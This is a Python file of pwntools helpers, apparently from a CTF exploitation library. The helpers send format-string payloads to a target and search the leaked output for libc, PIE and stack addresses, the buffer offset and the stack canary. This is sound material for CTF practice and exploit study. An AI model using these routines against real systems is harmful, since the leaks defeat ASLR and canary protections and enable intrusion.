from pwn import *
from re import findall, search
from typing import Generator
r_init = None
PWNSCRIPT_PRINTF_MIN = 5
PWNSCRIPT_PRINTF_MAX = 35
pack = {'i386': p32, 'amd64': p64}
def offset_to_regex(v: int) -> str: return '.*' + hex(v)[2:] + '$'
def offset_match(v: int, offset: int) -> bool: return offset == None or bool(search(offset_to_regex(offset), hex(v)))
def extract_all_hex(s: bytes) -> list:
    try: return list(map(lambda l: int(l,16), findall(b'0x[0-9a-f]+', s)))
    except IndexError: return []
def extract_first_hex(s: bytes) -> int:
    try: return int(findall(b'0x[0-9a-z]+', s)[0],16)
    except IndexError: return -1
def is_PIE_address(v: int) -> bool:
    '''Heuristic for _potential_ PIE addresses'''
    regex = '0x55.*' if context.arch == 'amd64' else '0x56.*'
    return v > 0 and search(regex, hex(v))
def is_stack_address(v: int) -> bool:
    regex = '0x7ff.*' if context.arch == 'amd64' else '0xff.*'
    return v > 0 and search(regex, hex(v))
def is_libc_address(v: int) -> bool:
    '''Heuristic for _potential_ libc addresses'''
    regex = '0x7f.*' if context.arch == 'amd64' else '0xf7.*'
    return v > 0 and search(regex, hex(v)) and not is_stack_address(v)


def _find_printf_offset_generic(requirement):
    def inner(sendprintf, regex=None) -> Generator[tuple, None, None]:
        for i in range(PWNSCRIPT_PRINTF_MIN, PWNSCRIPT_PRINTF_MAX):
            #%lx here is specific: 32-bit for i386 and 64-bit for amd64
            result = sendprintf('A'*8 + '0x%{}$lx\n'.format(i))
            v = extract_first_hex(result)
            if v == -1: continue    #if (nil) or if 
            if requirement(v, regex): yield i
        #implicit raise StopIteration
    return inner

@_find_printf_offset_generic
def find_printf_offset_regex(resp: int, regex: str) -> int:
    '''printf generic to search for a `regex`'''
    return search(regex, hex(resp))
@_find_printf_offset_generic
def find_printf_offset_libc(resp: int, offset: int) -> int:
    '''printf generic for libc addresses. `offset` is optional.
    Provide `offset` to search for a specific offset.'''
    return is_libc_address(resp) and offset_match(resp, offset)
@_find_printf_offset_generic
def find_printf_offset_PIE(resp: int, offset: int) -> int:
    '''printf generic for PIE addresses. `offset` is optional.
    Provide `offset` to search for a specific offset.'''
    return is_PIE_address(resp) and offset_match(resp, offset)

#TODO: EVERYTHING AFTER HERE
def _find_printf_offset_sendprintf(requirement):
    def inner(sendprintf) -> int:
        for i in range(1,PWNSCRIPT_PRINTF_MAX): #note that we're not handling unaligned printf
            v = extract_first_hex(sendprintf('A'*8 + '%{}$p\n'.format(i)))
            if v == -1: continue
            if requirement(v): return i
        raise RuntimeError
    return inner

@_find_printf_offset_sendprintf
def find_printf_offset_buffer(resp) -> int:
    expected = (0x41414141 if context.arch == 'i386' else 0x4141414141414141)
    return expected == resp
@_find_printf_offset_sendprintf
def find_printf_offset_code(resp) -> int:
    return findall({'i386': '0x804...', 'amd64': '0x40....'}[context.arch], hex(resp)) != []
@_find_printf_offset_sendprintf
def find_printf_offset_canary(resp) -> int:
    '''heuristic to find canary'''
    return resp % 0x100 == 0 and b'\x00' not in pack[context.arch](resp)[1:] and (context.arch == 'amd64' or (lambda b: b < 0xf0 and b != 0x08)(pack[context.arch](resp)[3]))
